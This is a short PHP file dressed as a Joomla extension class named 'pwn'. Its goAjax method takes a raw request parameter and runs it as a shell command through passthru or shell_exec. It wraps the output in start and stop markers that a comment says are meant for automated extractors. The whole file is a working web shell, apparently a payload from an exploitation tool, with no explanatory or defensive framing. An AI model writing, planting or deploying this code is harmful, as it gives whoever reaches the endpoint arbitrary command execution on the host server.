<?php
defined('_JEXEC') or die();
class pwn {
    public static function goAjax($input) {
        $cmd = $input->get('c', 'id', 'raw');
        if (!is_string($cmd) || $cmd === '') {
            $cmd = 'id';
        }
        // marker window so extractors are echo-immune
        echo "PWNOSTART\n";
        if (function_exists('passthru')) {
            passthru($cmd . ' 2>&1');
        } elseif (function_exists('shell_exec')) {
            echo shell_exec($cmd . ' 2>&1');
        } else {
            echo 'uid=' . getmyuid() . '(' . get_current_user() . ")\n";
        }
        echo "PWNOSTOP\n";
        return '';
    }
}
